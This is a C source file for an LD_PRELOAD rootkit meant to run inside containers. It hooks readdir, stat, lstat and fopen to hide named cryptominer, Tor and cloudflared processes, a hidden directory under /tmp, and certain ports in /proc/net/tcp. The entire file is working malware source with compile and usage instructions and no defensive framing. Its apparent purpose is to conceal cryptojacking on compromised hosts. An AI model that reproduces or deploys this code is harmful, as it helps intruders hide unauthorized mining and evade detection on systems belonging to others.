/*
 * Container Rootkit - LD_PRELOAD based stealth kit
 * Works in containers (no kernel module needed)
 * 
 * Hides:
 * - Processes (by PID and name)
 * - Network connections (specific ports)
 * - Files and directories
 * 
 * Compile: gcc -shared -fPIC -o librootkit.so container_rootkit.c -ldl
 * Usage: LD_PRELOAD=/path/to/librootkit.so <command>
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

// Configuration - processes/ports to hide
#define HIDDEN_PROCESS "peak"
#define HIDDEN_PROCESS2 "compute_task"
#define HIDDEN_PROCESS3 "compute_engine"
#define HIDDEN_PORT1 "8048"      // Kryptex Pearl port
#define HIDDEN_PORT2 "9050"      // Tor SOCKS5
#define HIDDEN_PORT3 "5053"      // Cloudflare DNS
#define HIDDEN_DIR "/tmp/compute_engine"

// Function pointers to original functions
static struct dirent *(*orig_readdir)(DIR *) = NULL;
static struct dirent64 *(*orig_readdir64)(DIR *) = NULL;
static int (*orig_stat)(const char *, struct stat *) = NULL;
static int (*orig_lstat)(const char *, struct stat *) = NULL;
static FILE *(*orig_fopen)(const char *, const char *) = NULL;

// Initialize function pointers
static void init_hooks(void) {
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
        orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
        orig_stat = dlsym(RTLD_NEXT, "stat");
        orig_lstat = dlsym(RTLD_NEXT, "lstat");
        orig_fopen = dlsym(RTLD_NEXT, "fopen");
    }
}

// Check if a string contains hidden process name
static int is_hidden_process(const char *name) {
    if (!name) return 0;
    return (strstr(name, HIDDEN_PROCESS) != NULL ||
            strstr(name, HIDDEN_PROCESS2) != NULL ||
            strstr(name, HIDDEN_PROCESS3) != NULL ||
            strstr(name, "peakminer") != NULL ||
            strstr(name, "tor") != NULL ||
            strstr(name, "cloudflared") != NULL ||
            strstr(name, "torsocks") != NULL);
}

// Check if this is a /proc entry to hide
static int should_hide_proc(const char *name) {
    if (!name) return 0;
    
    // Read /proc/[pid]/cmdline to check process name
    char path[256], cmdline[256];
    snprintf(path, sizeof(path), "/proc/%s/cmdline", name);
    
    FILE *f = orig_fopen(path, "r");
    if (!f) return 0;
    
    if (fgets(cmdline, sizeof(cmdline), f)) {
        fclose(f);
        return is_hidden_process(cmdline);
    }
    
    fclose(f);
    return 0;
}

// Check if network connection should be hidden
static int should_hide_net_line(const char *line) {
    if (!line) return 0;
    return (strstr(line, HIDDEN_PORT1) != NULL ||
            strstr(line, HIDDEN_PORT2) != NULL ||
            strstr(line, HIDDEN_PORT3) != NULL);
}

// Hook readdir - hide directory entries
struct dirent *readdir(DIR *dirp) {
    init_hooks();
    
    struct dirent *entry;
    do {
        entry = orig_readdir(dirp);
        if (!entry) return NULL;
        
        // Check if this is /proc
        char *dirpath = (char *)dirp;
        if (strstr(dirpath, "/proc") && should_hide_proc(entry->d_name)) {
            continue; // Skip this entry
        }
        
        // Check if this is hidden directory
        if (strcmp(entry->d_name, "compute_engine") == 0 ||
            strcmp(entry->d_name, "peakminer") == 0 ||
            strcmp(entry->d_name, "processor") == 0 ||
            strcmp(entry->d_name, ".tor") == 0) {
            continue;
        }
        
        break;
    } while (1);
    
    return entry;
}

// Hook readdir64 - 64-bit version
struct dirent64 *readdir64(DIR *dirp) {
    init_hooks();
    
    struct dirent64 *entry;
    do {
        entry = orig_readdir64(dirp);
        if (!entry) return NULL;
        
        char *dirpath = (char *)dirp;
        if (strstr(dirpath, "/proc") && should_hide_proc(entry->d_name)) {
            continue;
        }
        
        if (strcmp(entry->d_name, "compute_engine") == 0 ||
            strcmp(entry->d_name, "peakminer") == 0 ||
            strcmp(entry->d_name, "processor") == 0 ||
            strcmp(entry->d_name, ".tor") == 0) {
            continue;
        }
        
        break;
    } while (1);
    
    return entry;
}

// Hook stat - hide files
int stat(const char *pathname, struct stat *statbuf) {
    init_hooks();
    
    if (pathname && strstr(pathname, HIDDEN_DIR)) {
        return -1; // File not found
    }
    
    return orig_stat(pathname, statbuf);
}

// Hook lstat - hide symlinks
int lstat(const char *pathname, struct stat *statbuf) {
    init_hooks();
    
    if (pathname && strstr(pathname, HIDDEN_DIR)) {
        return -1;
    }
    
    return orig_lstat(pathname, statbuf);
}

// Hook fopen - filter network connection files
FILE *fopen(const char *pathname, const char *mode) {
    init_hooks();
    
    FILE *f = orig_fopen(pathname, mode);
    if (!f) return NULL;
    
    // If opening /proc/net/tcp or similar, we need to filter lines
    if (pathname && (strstr(pathname, "/proc/net/tcp") ||
                     strstr(pathname, "/proc/net/tcp6"))) {
        // Create a filtered temp file
        FILE *temp = tmpfile();
        if (!temp) return f;
        
        char line[1024];
        while (fgets(line, sizeof(line), f)) {
            if (!should_hide_net_line(line)) {
                fputs(line, temp);
            }
        }
        
        fclose(f);
        rewind(temp);
        return temp;
    }
    
    return f;
}

// Constructor - called when library is loaded
__attribute__((constructor))
static void rootkit_init(void) {
    init_hooks();
    // Silent initialization
}
